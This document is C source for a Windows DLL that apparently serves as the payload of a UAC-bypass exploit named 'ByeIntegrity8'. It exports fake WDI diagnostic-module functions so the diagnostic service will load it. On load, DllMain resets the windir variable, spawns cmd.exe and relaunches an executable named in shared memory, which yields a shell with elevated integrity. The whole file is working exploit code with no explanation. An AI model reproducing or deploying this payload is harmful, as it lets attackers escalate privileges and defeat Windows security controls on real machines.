#include <Windows.h>
#include <ShlObj.h>

__declspec(dllexport) HRESULT WdiHandleInstance(
	PVOID instanceData,
	int unused1
)
{
	UNREFERENCED_PARAMETER(instanceData);
	UNREFERENCED_PARAMETER(unused1);

	/* Called to handle the diagnostic instance in the queue (program compatibility assistance in our case),
	* does not seem to matter if return code is success or error (maybe it does for Wdi logging.) */
	return S_OK;
}

__declspec(dllexport) HRESULT WdiDiagnosticModuleMain(
	void* unused0,
	int unused1
)
{
	UNREFERENCED_PARAMETER(unused0);
	UNREFERENCED_PARAMETER(unused0);

	// must return a success code otherwise module is unloaded and queue isn't flushed
	return S_OK;
}

__declspec(dllexport) ULONG_PTR WdiGetDiagnosticModuleInterfaceVersion() { return 1ULL; }

PWSTR PaConcatString(
	PWSTR string,
	PWSTR appendString
)
{
	PWSTR data = (PWSTR)HeapAlloc(GetProcessHeap(), 0,
		((wcslen(string) * sizeof(WCHAR)) + sizeof(L'\0')) +
		((wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0')));
	if (data) {
		memcpy(data, string, wcslen(string) * sizeof(WCHAR));
		memcpy(data + wcslen(string), appendString,
			(wcslen(appendString) * sizeof(WCHAR)) + sizeof(L'\0'));
	}
	return data;
}

BOOL WINAPI DllMain(
	HINSTANCE hInstance,
	DWORD reason,
	LPVOID reserved
)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(reserved);

	if (reason == DLL_PROCESS_ATTACH)
	{
		PWSTR winDir = NULL, system32 = NULL;
		HRESULT hr;
		BOOL exitCode = FALSE;
		PUCHAR exeName = NULL;
		PWSTR cmdPath = NULL;
		STARTUPINFOW si;
		PROCESS_INFORMATION pi;
		HANDLE hSharedMemory, hEvent = NULL;
		WCHAR stopCmd[2];

		hSharedMemory = OpenFileMappingW(FILE_MAP_WRITE, FALSE, L"ByeIntegrity8");
		if (!hSharedMemory)
			goto eof;

		exeName = MapViewOfFile(hSharedMemory, FILE_MAP_WRITE, 0, 0, 0);
		if (!exeName)
			goto eof;

		hEvent = OpenEventW(EVENT_MODIFY_STATE, FALSE, L"ByeIntegrity8Loaded");
		if (!hEvent)
			goto eof;

		hr = SHGetKnownFolderPath(&FOLDERID_Windows, 0, NULL, &winDir);
		if (!SUCCEEDED(hr))
			goto eof;

		hr = SHGetKnownFolderPath(&FOLDERID_System, 0, NULL, &system32);
		if (!SUCCEEDED(hr))
			goto eof;

		cmdPath = PaConcatString(system32, L"\\cmd.exe");
		if (!cmdPath)
			goto eof;

		if (!SetEnvironmentVariableW(L"windir", winDir))
			goto eof;

		ZeroMemory(&si, sizeof(STARTUPINFOW));
		si.cb = sizeof(STARTUPINFOW);
		if (!CreateProcessW(cmdPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			goto eof;

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		stopCmd[0] = L'2';
		stopCmd[1] = L'\0';
		if (CreateProcessW((LPCWSTR)exeName, stopCmd, NULL, NULL, FALSE,
			CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}

		SetEvent(hEvent);
		exitCode = TRUE;

eof:
		if (hSharedMemory)
			CloseHandle(hSharedMemory);
		if (hEvent)
			CloseHandle(hEvent);
		if (exeName)
			UnmapViewOfFile(exeName);
		if (winDir)
			CoTaskMemFree(winDir);
		if (system32)
			CoTaskMemFree(system32);
		if (cmdPath)
			HeapFree(GetProcessHeap(), 0, cmdPath);
		return exitCode;
	}
	return TRUE;
}